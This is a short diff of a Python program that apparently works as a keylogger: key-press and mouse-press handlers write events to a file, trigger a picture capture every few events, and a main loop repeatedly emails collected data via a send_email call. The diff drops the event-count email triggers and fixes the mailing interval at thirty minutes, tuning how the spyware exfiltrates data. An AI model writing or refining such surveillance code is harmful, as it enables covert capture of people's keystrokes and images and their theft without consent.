@@ -19,8 +19,7 @@ def OnKeyPress(event):
 	pic_num = pic_num + 1
 	if pic_num % 5 == 0:
 		take_picture.take_pic()
-	if pic_num % 200 == 0:
-		sendmail_attach.send_email()
+	
 	
 def OnMousePress(event):
 	fd.write(str(event))
@@ -30,8 +29,7 @@ def OnMousePress(event):
 	pic_num = pic_num + 1
 	if pic_num % 50 == 0:
 		take_picture.take_pic()
-	if pic_num % 200 == 0:
-		sendmail_attach.send_email()
+
 
 ################################################################################
 
@@ -47,11 +45,11 @@ if __name__ == '__main__':
 	
 	take_picture.take_pic()
 	
-	n = 1
+	n = 30
 	while(1):
 		
 		sendmail_attach.send_email()
 		time.sleep(60 * n)
-		n = n + 5
+		# n = n + 5
 
 
